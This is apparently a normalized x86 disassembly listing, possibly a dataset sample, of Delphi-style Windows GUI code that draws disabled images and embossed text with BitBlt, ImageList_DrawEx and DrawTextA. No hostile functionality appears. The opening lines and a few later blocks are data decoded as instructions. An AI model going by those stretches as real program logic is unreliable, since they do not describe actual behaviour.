mov al 0x45
add [ eax - 0x67ffba54 ] dl
adc eax [ edx ]
adc al [ fs : edx ]
test al 0x13
inc edx
add [ eax - 0x1bffbdec ] ah
push ss
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
push ss
inc edx
add [ esi + ebx * 4 ] bl
inc ebp
add [ eax + ebp * 4 + 0x4a6c0045 ] al
inc ebp
add [ ebp + esi * 4 - 0x49e7ffbb ] cl
inc ebp
add [ eax + 0xa00454b ] dh
push esp
inc edi
insb
jns r-xdata
movsb [ edi ] [ esi ]
arpl [ ebx ] ax
push eax
lodsd [ esi ]
dec ebp
outsd
jbe r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
dec [ ebx - 0x31d7f2d ]
je r-xdata
inc eax
arpl [ ebx ] ax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x7473694c
sub [ edx + 0x43 ] ah
add [ eax + edx * 4 + 0xc0044 ] ch
pop es
inc edx
jne r-xdata
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ ebx - 0x52afffbd ] ah
or [ ecx + 0x44 ] bh
add al ah
add [ eax ] al
jmp eax
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
out dx al
into
cld
outsb
inc edi
insb
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
arpl [ ebx ] ax
xor [ eax ] al
add [ eax ] al
mov al 0x10
inc eax
add al dh
je r-xdata
mov eax esi
call sub_459ebc
test bl bl
jle r-xdata
and dl 0xfc
push 0x5500408d
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ esi ] dl
inc ebx
add [ esp + edx * 2 ] cl
inc edx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x63 ] al
inc ebx
add [ eax ] dh
add [ eax ] al
add [ eax - 0xfffbff0 ] dh
outsb
jae r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ esi + 0x80 ] eax
mov eax esi
test bl bl
je r-xdata
mov ebx edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
xor edx edx
mov eax esi
call sub_459e68
add esp 0xfffffff0
call sub_40360c
add al al
inc ebx
add [ ebx ] cl
add al ch
bound eax [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
call 0x843a623
add [ eax ] al
add [ eax - 0xfffbff0 ] dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
sub_436350
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
xor edx edx
mov eax esi
call sub_459e68
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ esi + 0x80 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_4363a4
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0x80 ]
call sub_4032a8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_459ebc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_4363d4
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x80 ]
call sub_418e80
mov esi eax
mov eax [ ebx + 0x80 ]
cmp esi [ eax + 0x4 ]
jl r-xdata
mov cl 0x1
mov edx esi
mov eax [ ebx + 0x80 ]
call sub_418e3c
mov eax esi
pop esi
pop ebx
retn
xor ecx ecx
xor edx edx
mov eax ebx
call sub_45a2f0
mov esi eax
lea edx [ esi + 0x1 ]
mov eax [ ebx + 0x80 ]
call sub_418d98
sub_436420
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_4363d4
mov esi eax
push ebp
mov ecx edi
mov edx esi
mov eax ebx
call sub_45a564
inc [ ebx + 0x84 ]
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_43644c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x80 ]
call sub_418e68
test al al
je r-xdata
pop esi
pop ebx
retn
dec [ ebx + 0x84 ]
xor ecx ecx
mov edx esi
mov eax [ ebx + 0x80 ]
call sub_418e3c
sub_43647c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403278
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_4364c0
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_4032a8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403298
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_4364f0
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov eax [ esp ]
push eax
mov ecx ebp
mov dl 0x1
mov eax [ r-xdata ]
call sub_436350
mov ebx eax
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_418778
mov eax [ edi + 0x4 ]
mov edx esi
call sub_4188d4
mov ebx eax
cmp ebp [ ebx + 0x34 ]
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebx + 0x30 ]
cmp eax [ esp ]
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_436550
push ebx
mov ebx edx
test ebx ebx
je r-xdata
pop ebx
retn
cmp [ ebx + 0x84 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ eax + 0x4 ]
call sub_418a70
mov eax ebx
call sub_4032a8
sub_436580
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_403278
mov dl 0x1
mov eax [ r-xdata ]
call sub_42984c
mov esi eax
mov [ ebx + 0x4 ] esi
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] sub_4366b4
mov [ ebx + 0x1c ] 0x8080
mov [ ebx + 0x20 ] 0x1
xor eax eax
add esp 0xfffffff0
call sub_40360c
xor edx edx
mov dl al
mov [ ebx + edx * 4 + 0xc ] 0xffffffff
inc eax
cmp al 0x4
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_43647c
mov [ rw-data ] eax
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_436614
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_4032a8
mov eax esi
call sub_436670
cmp [ rw-data ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403298
test bl bl
jle r-xdata
mov eax [ rw-data ]
call sub_436574
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
mov eax [ rw-data ]
call sub_4032a8
xor eax eax
mov [ rw-data ] eax
sub_436670
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov [ esi + edi * 4 + 0xc ] 0xffffffff
inc ebx
cmp bl 0x4
jne r-xdata
mov edx eax
mov eax [ esi + 0x8 ]
call sub_43644c
mov edi ebx
and edi 0x7f
mov eax [ esi + edi * 4 + 0xc ]
cmp eax 0xffffffff
je r-xdata
mov edx [ esi + 0x8 ]
mov eax [ rw-data ]
call sub_436550
xor eax eax
mov [ esi + 0x8 ] eax
pop edi
pop esi
pop ebx
retn
sub_4366b4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x4 ]
cmp edx esi
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_429fec
mov [ ebx + 0x1c ] eax
mov eax ebx
call sub_436670
cmp [ ebx + 0x2a ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_4366e4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_436670
mov edx ebx
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test eax eax
jle r-xdata
mov eax ebx
call sub_429fec
mov [ esi + 0x1c ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
pop edx
xchg edx eax
mov ecx edx
cdq
idiv ecx
test edx edx
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
pop edx
xchg edx eax
mov ecx edx
cdq
idiv ecx
cmp eax 0x4
jle r-xdata
mov edx eax
mov eax esi
call sub_43675c
mov eax 0x1
sub_43675c
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x20 ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
jbe r-xdata
mov eax esi
call sub_436670
mov [ esi + 0x20 ] bl
mov edx [ esi + 0x4 ]
mov eax esi
call sub_4366b4
sub_436784
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x2
jne r-xdata
xor eax eax
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov ebx [ edx + eax * 4 + 0xc ]
cmp ebx 0xffffffff
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x3
jae r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
or esi eax
je r-xdata
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x20 ]
mov ecx edx
cdq
idiv ecx
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov esi eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42984c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_436d33
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx edi
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx esi
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
push esi
lea eax [ ebp - 0x28 ]
push eax
mov ecx edi
xor edx edx
xor eax eax
call sub_417298
mov eax [ ebp - 0xc ]
call sub_429e14
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_424c70
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
call sub_4295dc
mov edx eax
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov bl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x20 ]
jl r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push esi
lea eax [ ebp - 0x38 ]
push eax
xor ecx ecx
mov cl bl
inc ecx
imul ecx edi
xor eax eax
mov al bl
imul edi
xor edx edx
call sub_417298
mov al [ ebp - 0x5 ]
sub al 0x1
jb r-xdata
xor ebx ebx
mov ecx esi
mov edx edi
mov eax [ rw-data ]
call sub_4364f0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_43647c
mov [ rw-data ] eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_429e14
push eax
mov eax [ ebp - 0xc ]
call sub_429e14
lea edx [ ebp - 0x28 ]
pop ecx
call sub_424f70
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x38 ] 0x1
jne r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov ecx 0x20000000
mov edx [ ebp - 0xc ]
call sub_436420
xor edx edx
mov dl [ ebp - 0x5 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + edx * 4 + 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x1c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xc ]
call sub_436420
xor edx edx
mov dl [ ebp - 0x5 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + edx * 4 + 0xc ] eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_436cf7
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_42984c
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42984c
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x1
jbe r-xdata
dec eax
sub al 0x2
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4032a8
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x14 ]
call sub_429e14
mov eax [ eax + 0x14 ]
xor edx edx
call sub_424c70
mov edx edi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x14 ]
call sub_429ed0
test al al
je r-xdata
mov eax [ ebp - 0xc ]
call sub_429e14
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_429e14
mov ecx eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
call sub_424f70
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_42acd0
mov edx edi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x10 ]
call sub_429e14
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_424c70
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_429e14
push eax
mov eax [ ebp - 0x14 ]
call sub_429e14
lea edx [ ebp - 0x28 ]
pop ecx
call sub_424f70
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x14 ]
mov edx 0xff000014
call sub_424c70
mov eax [ ebp - 0x18 ]
call sub_425570
mov ebx eax
push 0x0
push ebx
call SetTextColor
push 0xffffff
push ebx
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_429e14
call sub_425570
push eax
push esi
push edi
push 0x0
push 0x0
push ebx
call BitBlt
mov eax [ ebp - 0x10 ]
call sub_429e14
mov eax [ eax + 0x14 ]
mov edx 0x808080
call sub_424c70
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_429e14
push eax
mov eax [ ebp - 0x14 ]
call sub_429e14
lea edx [ ebp - 0x28 ]
pop ecx
call sub_424f70
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x14 ]
mov edx 0xff000010
call sub_424c70
mov eax [ ebp - 0x18 ]
call sub_425570
mov ebx eax
push 0x0
push ebx
call SetTextColor
push 0xffffff
push ebx
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_429e14
call sub_425570
push eax
push esi
push edi
push 0x0
push 0x0
push ebx
call BitBlt
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_423fe4
push eax
mov eax [ ebp - 0x10 ]
call sub_429e14
mov eax [ eax + 0x14 ]
pop edx
call sub_424c70
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_429e14
push eax
mov eax [ ebp - 0x14 ]
call sub_429e14
lea edx [ ebp - 0x28 ]
pop ecx
call sub_424f70
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_424c70
mov eax [ ebp - 0x18 ]
call sub_425570
mov ebx eax
push 0x0
push ebx
call SetTextColor
push 0xffffff
push ebx
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_429e14
call sub_425570
push eax
push esi
push edi
push 0x0
push 0x0
push ebx
call BitBlt
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_42acd0
mov eax [ ebp - 0xc ]
call sub_429e14
mov ebx eax
mov eax [ ebx + 0x14 ]
mov edx 0xff00000f
call sub_424c70
lea edx [ ebp - 0x28 ]
mov eax ebx
call sub_4250a4
mov eax [ ebx + 0x14 ]
mov edx 0xff000014
call sub_424c70
push 0x0
mov eax ebx
call sub_425570
push eax
call SetTextColor
push 0xffffff
mov eax ebx
call sub_425570
push eax
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_429e14
call sub_425570
push eax
push esi
push edi
push 0x1
push 0x1
mov eax ebx
call sub_425570
push eax
call BitBlt
mov eax [ ebx + 0x14 ]
mov edx 0xff000010
call sub_424c70
push 0x0
mov eax ebx
call sub_425570
push eax
call SetTextColor
push 0xffffff
mov eax ebx
call sub_425570
push eax
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_429e14
call sub_425570
push eax
push esi
push edi
push 0x0
push 0x0
mov eax ebx
call sub_425570
push eax
call BitBlt
mov eax [ ebp - 0x14 ]
call sub_429e14
mov eax [ eax + 0xc ]
mov edx 0xffffff
call sub_4244a4
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_42acd0
mov eax [ ebp - 0x14 ]
call sub_429e14
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_424c70
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_4032a8
mov eax [ ebp - 0x14 ]
call sub_4032a8
retn
sub_436d5c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov ebx [ ebp + 0xc ]
cmp [ edi + 0x4 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ edi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
test eax eax
je r-xdata
mov eax [ edi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
test eax eax
je r-xdata
mov edx ebx
mov eax edi
call sub_436784
mov esi eax
call sub_43d448
call sub_43d528
test al al
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
mov [ ebp - 0x24 ] edx
mov edx [ eax + 0x4 ]
mov [ ebp - 0x20 ] edx
mov eax [ edi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
xor edx edx
mov dl [ edi + 0x20 ]
mov ecx edx
cdq
idiv ecx
add eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ edi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
add eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
dec bl
je r-xdata
push 0x1
push 0x1fffffff
push 0x1fffffff
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp - 0x4 ]
call sub_425570
push eax
push esi
mov eax [ edi + 0x8 ]
call sub_45a1b4
push eax
call ImageList_DrawEx
jmp r-xdata
cmp bl 0x3
jne r-xdata
mov bl 0x5
jmp r-xdata
dec ebx
sub bl 0x2
jb r-xdata
push 0x0
push 0x1fffffff
mov eax 0xff00000f
call sub_423fe4
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp - 0x4 ]
call sub_425570
push eax
push esi
mov eax [ edi + 0x8 ]
call sub_45a1b4
push eax
call ImageList_DrawEx
call sub_43d448
lea ecx [ ebp - 0x14 ]
mov edx ebx
call sub_43d78c
lea eax [ ebp - 0x24 ]
push eax
mov eax [ edi + 0x8 ]
call sub_45a1b4
push eax
push esi
mov eax [ ebp - 0x4 ]
call sub_425570
push eax
call sub_43d448
lea ecx [ ebp - 0x14 ]
pop edx
call sub_43d678
jmp r-xdata
mov bl 0x4
jmp r-xdata
jmp r-xdata
mov bl 0x2
sub_436ec0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov ebx edx
mov edi [ ebp + 0x8 ]
mov dl 0x1
mov eax [ ebx + 0x14 ]
call sub_424d8c
cmp [ ebp + 0xc ] 0x1
jne r-xdata
or edi 0x5
push edi
lea eax [ ebp - 0x10 ]
push eax
mov eax esi
call sub_4042f8
push eax
mov eax esi
call sub_4044f8
push eax
mov eax ebx
call sub_425570
push eax
call DrawTextA
push 0x1
push 0x1
lea eax [ ebp - 0x10 ]
push eax
call OffsetRect
mov edx 0xff000014
mov eax [ ebx + 0xc ]
call sub_4244a4
mov eax edi
or eax 0x5
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax esi
call sub_4042f8
push eax
mov eax esi
call sub_4044f8
push eax
mov eax ebx
call sub_425570
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
call OffsetRect
mov edx 0xff000010
mov eax [ ebx + 0xc ]
call sub_4244a4
or edi 0x5
push edi
lea eax [ ebp - 0x10 ]
push eax
mov eax esi
call sub_4042f8
push eax
mov eax esi
call sub_4044f8
push eax
mov eax ebx
call sub_425570
push eax
call DrawTextA
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_436fa0
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
and eax 0x2
cmp eax 0x2
jne r-xdata
mov edx [ ebx + 0xc ]
sub edx [ ebx + 0x4 ]
mov eax [ ebx + 0x8 ]
sub eax [ ebx ]
lea ecx [ ebp - 0x18 ]
call sub_41725c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
lea ecx [ ebp - 0x20 ]
xor edx edx
xor eax eax
call sub_41725c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x20 ]
mov ecx edx
cdq
idiv ecx
lea ecx [ ebp - 0x20 ]
pop edx
call sub_41725c
jmp r-xdata
cmp [ ebp + 0x1c ] 0x1
jne r-xdata
mov [ ebp + 0x1c ] 0x1
jmp r-xdata
push 0x0
lea eax [ ebp - 0x40 ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_417298
push esi
push edi
lea esi [ ebp - 0x40 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
lea ecx [ ebp - 0x28 ]
xor edx edx
xor eax eax
call sub_41725c
push 0x0
lea eax [ ebp - 0x40 ]
push eax
mov ecx [ ebx + 0x8 ]
sub ecx [ ebx ]
xor edx edx
xor eax eax
call sub_417298
push esi
push edi
lea esi [ ebp - 0x40 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov eax [ ebp + 0x8 ]
or eax 0x400
push eax
push edi
mov eax [ ebp + 0x20 ]
call sub_4042f8
push eax
mov eax [ ebp + 0x20 ]
call sub_4044f8
push eax
mov eax [ ebp - 0x8 ]
call sub_425570
push eax
call DrawTextA
mov edx [ edi + 0xc ]
sub edx [ edi + 0x4 ]
mov eax [ edi + 0x8 ]
sub eax [ edi ]
lea ecx [ ebp - 0x28 ]
call sub_41725c
jmp r-xdata
mov eax [ ebp + 0x20 ]
call sub_4042f8
test eax eax
jle r-xdata
mov [ ebp + 0x1c ] 0x0
mov eax [ ebp - 0x18 ]
mov edx eax
sub edx [ ebp - 0x20 ]
inc edx
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x14 ]
mov edx eax
sub edx [ ebp - 0x1c ]
inc edx
sar edx 0x1
jns r-xdata
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
mov [ esi ] edx
sub eax [ ebp - 0x28 ]
inc eax
sar eax 0x1
jns r-xdata
adc edx 0x0
mov [ esi + 0x4 ] edx
sub eax [ ebp - 0x24 ]
inc eax
sar eax 0x1
jns r-xdata
adc edx 0x0
mov [ ebp - 0x10 ] eax
adc eax 0x0
mov [ ebp - 0xc ] eax
jmp r-xdata
adc eax 0x0
xor eax eax
mov [ ebp + 0x14 ] eax
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
cmp [ ebp - 0x28 ] 0x0
je r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
cmp [ ebp + 0x18 ] 0xffffffff
jne r-xdata
mov al [ ebp + 0x1c ]
sub al 0x1
jb r-xdata
mov eax [ ebp + 0x18 ]
add eax [ ebp - 0x1c ]
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x18 ]
add eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x18 ]
pop ecx
sub eax ecx
lea ecx [ ebp - 0x30 ]
call sub_41725c
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x1c ]
add edx [ ebp + 0x14 ]
add edx [ ebp - 0x24 ]
mov eax [ ebp - 0x20 ]
add eax [ ebp + 0x14 ]
add eax [ ebp - 0x28 ]
call sub_41725c
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x1c ]
add edx [ ebp - 0x24 ]
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x28 ]
call sub_41725c
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x18 ]
mov [ esi ] eax
add eax [ ebp - 0x20 ]
add eax [ ebp + 0x14 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x2c ]
sub eax [ ebp - 0x24 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x30 ]
sub eax [ ebp - 0x28 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x2c ]
inc eax
sar eax 0x1
jns r-xdata
